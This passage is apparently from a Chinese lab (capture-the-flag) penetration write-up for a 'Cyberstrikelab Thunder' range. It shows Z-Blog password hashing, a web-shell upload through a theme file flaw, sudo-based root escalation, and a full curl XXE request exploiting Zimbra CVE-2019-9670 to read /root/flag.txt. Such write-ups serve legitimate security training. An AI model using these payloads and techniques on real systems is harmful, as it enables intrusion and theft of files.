+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import hashlib
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ps = &#34;123456&#34;
+</span></span><span class="line"><span class="cl">guid = &#34;24d876c8772572cf839674c5a176e41c&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">first_hash = hashlib.md5(ps.encode(&#39;utf-8&#39;)).hexdigest()
+</span></span><span class="line"><span class="cl">result = hashlib.md5((first_hash + guid).encode(&#39;utf-8&#39;)).hexdigest()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(result)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//30492f76a0fbcf3906cce8b4b566d6b6</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>登录成功
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100852441.png' alt="/posts/cslab-thunder/file-20250325100852441.png" height="463" width="872"></p>
+<h2 class="heading-element" id="文件上传"><span>文件上传</span>
+  <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>尝试修改后台设置进行文件上传
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100903494.png' alt="/posts/cslab-thunder/file-20250325100903494.png" height="112" width="870"></p>
+<p>失败，仍然无法上传
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325100940145.png' alt="/posts/cslab-thunder/file-20250325100940145.png" height="365" width="893">
+Z-Blog 后台存在模板文件 <code>.zba</code> 上传漏洞
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101008609.png' alt="/posts/cslab-thunder/file-20250325101008609.png" height="400" width="840"></p>
+<p>上传 <code>shell.zba</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101018604.png' alt="/posts/cslab-thunder/file-20250325101018604.png" height="467" width="871"></p>
+<p>访问 <code>http://ip/zb_users/theme/shell/template/shelll.php</code> ，成功
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101025125.png' alt="/posts/cslab-thunder/file-20250325101025125.png" height="330" width="871"></p>
+<h2 class="heading-element" id="提权"><span>提权</span>
+  <a href="#%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Linux 系统，查询当前用户特权</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -l</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>发现对 <code>/home/www/write.sh</code> 文件具有 <code>root</code> 权限且无需密码
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101031478.png' alt="/posts/cslab-thunder/file-20250325101031478.png" height="267" width="865"></p>
+<p>修改文件，第二行加入 <code>/bin/bash</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101036633.png' alt="/posts/cslab-thunder/file-20250325101036633.png" height="444" width="867"></p>
+<p>执行文件，提权成功
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101200872.png' alt="/posts/cslab-thunder/file-20250325101200872.png" height="95" width="380"></p>
+<p>读取 flag
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101241782.png' alt="/posts/cslab-thunder/file-20250325101241782.png" height="410" width="584"></p>
+<h1 class="heading-element" id="第四台主机"><span>第四台主机</span>
+  <a href="#%e7%ac%ac%e5%9b%9b%e5%8f%b0%e4%b8%bb%e6%9c%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="zimbra-xxe"><span>Zimbra XXE</span>
+  <a href="#zimbra-xxe" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>发现新网段 <code>10.1.1.*</code>
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101258936.png' alt="/posts/cslab-thunder/file-20250325101258936.png" height="358" width="873"></p>
+<p>探测存活，发现10.1.1.56，对指定 IP 进行全端口扫描及漏洞扫描，发现存在 CVE-2019-9670 Vuln
+<img loading="lazy" src='/posts/cslab-thunder/file-20250325101308501.png' alt="/posts/cslab-thunder/file-20250325101308501.png" height="594" width="870"></p>
+<p>读取 Flag</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -k -X POST https://10.1.1.56/Autodiscover/Autodiscover.xml \
+</span></span><span class="line"><span class="cl">-H &#34;Host: 10.1.1.56&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/66.0&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Accept-Encoding: gzip, deflate&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Referer: https://mail.****.com/zimbra/&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Content-Type: application/soap+xml&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Connection: close&#34; \
+</span></span><span class="line"><span class="cl">-H &#34;Cookie: ZM_TEST=true&#34; \
+</span></span><span class="line"><span class="cl">--data &#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE xxe [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT name ANY &gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;file:///root/flag.txt&#34; &gt;]&gt;
+</span></span><span class="line"><span class="cl">&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;Request&gt;
+</span></span><span class="line"><span class="cl">    &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
+</span></span><span class="line"><span class="cl">    &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;
+</span></span><span class="line"><span class="cl">  &lt;/Request&gt;
+</span></span><span class="line"><span class="cl">&lt;/Autodiscover&gt;&#39;</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p><img loading="lazy" src='/posts/cslab-thunder/file-20250325100225223.png' alt="/posts/cslab-thunder/file-20250325100225223.png" height="500" width="873"></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-05-01 12:09:56">Updated on 2026-05-01&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/cslab-thunder/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/cslab-thunder/" data-title="Cyberstrikelab Thunder Writeup" data-hashtags="Cyberstrikelab"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/cslab-thunder/" data-hashtag="Cyberstrikelab"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/cslab-thunder/" data-title="Cyberstrikelab Thunder Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/cyberstrikelab/" class="post-tag" title="Tags - Cyberstrikelab">Cyberstrikelab</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" class="post-nav-item" rel="prev" title="PolarCTF 2025 春季个人赛 Web Writeup"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>PolarCTF 2025 春季个人赛 Web Writeup</a><a href="/posts/cslab-pearl/" class="post-nav-item" rel="next" title="Cyberstrikelab Pearl Writeup">Cyberstrikelab Pearl Writeup<i class="fa-solid fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#免杀上线">免杀上线</a></li>
+    <li><a href="#内网信息收集">内网信息收集</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#mysql-服务爆破">MYSQL 服务爆破</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#文件上传">文件上传</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#zimbra-xxe">Zimbra XXE</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://github.com/L1nq0" target="_blank" rel="external nofollow noopener noreferrer">L1nq</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/95ccd2bf51643860b954920139bcad53.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
